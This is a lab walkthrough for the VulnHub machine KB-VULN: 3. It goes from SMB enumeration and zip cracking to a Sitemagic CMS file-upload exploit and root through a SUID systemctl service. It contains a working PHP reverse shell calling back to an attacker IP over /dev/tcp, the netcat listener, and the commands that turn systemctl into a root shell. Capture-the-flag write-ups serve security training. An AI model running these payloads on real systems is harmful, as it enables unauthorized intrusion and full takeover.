# KB-VULN: 3

[Machine](https://www.vulnhub.com/entry/kb-vuln-3,579/ "https://www.vulnhub.com/entry/kb-vuln-3,579/")

## Reconnaissance 

### nmap

* ssh
* http
* smb

### smb

Guest access is allowed.
To see the directories:
```
smbclient --no-pass -L //192.168.0.101/
```
To see inside Files dir:
```
smbclient --no-pass //192.168.0.101/Files
```
Now you will get a `website.zip` file with password protection.

#### john the reaper

To get the hash of the files inside a zip
```
zip2john website.zip > website.hash
```

To crack the hash:
```
john -w=/usr/share/wordlists/rockyou.txt website.hash
```
So, the password is `porchman`. There is a file README.txt, in which we have creds from `the Heisenberg website`.

### http

Change `/etc/hosts` by adding `kb.vuln` ip-address.
Go to a web-site and you'll see the Sitemagic CMS banner...
Run a `dirb` to find the admin url:
```
dirb http://kb.vuln/ /usr/share/wordlists/dirb/big.txt -o dirb.txt
```
kb.vuln/admin was found.

Also, check the version of CMS with `whatweb`. But it will not give a result. So, you can just search for a version inside the files in `sitemagic` folder from `website.zip`.
In the end, you will receive the 4.4.2 version of CMS.

I found a file upload function.

## Thread modeling

* We have a cred `admin:jesse`.
* File upload.
* Reverse shell to the server and we will get the shell.

## Vulnerability analysis

CMS version is vulnerable!
```
searchsploit sitemagic
```
"Arbitrary File Upload (Authenticated)".

## Exploitation

My reverse shell is simple:
```
<?php exec("bash -c 'bash -i >& /dev/tcp/192.168.0.106/4444 0>&1'"); ?>
```
Go to `http://kb.vuln/index.php?SMExt=SMFiles`. I uploaded the shell to `images`. Next, trigger the shell with `kb.vuln/files/images/shell.php` and an enabled server(`nc -lnvp 4444`).

## Post exploitation

### Try to change user
Got shell, but as a `www-data` user. With `/etc/passwd` or `/home` or you could guess in `README.txt` another user `heisenberg`. I tried to brute-force ssh with his "login" and `hydra`, but it didn't work.

### Privilege escalation
With `find / -perm -4000 -type f 2>/dev/null` or LinEnum.sh or linpeas.sh(which use this command, I think) you can get the list of SUID binaries. Among them `systemctl`.
Next, to exploit systemctl you need to write a `.service` file that will establish the reverse shell. My [shell.service](post/shell.service).
Copy script to `/var/www/html` and start apache with `systemctl start apache2`. Then on target `wget http://your.ip.address/shell.service`.
For some reason, systemctl don't want to link file in `/tmp`. So, I did it in folder where shell was spawned(`/var/www/html/sitemagic/files/images`).
```
systemctl link /var/www/html/sitemagic/files/images/shell.service
systemctl start shell.service
```
Got root.

## Sources

[systemctl .service examples](https://www.shellhacks.com/systemd-service-file-example/ "https://www.shellhacks.com/systemd-service-file-example/")
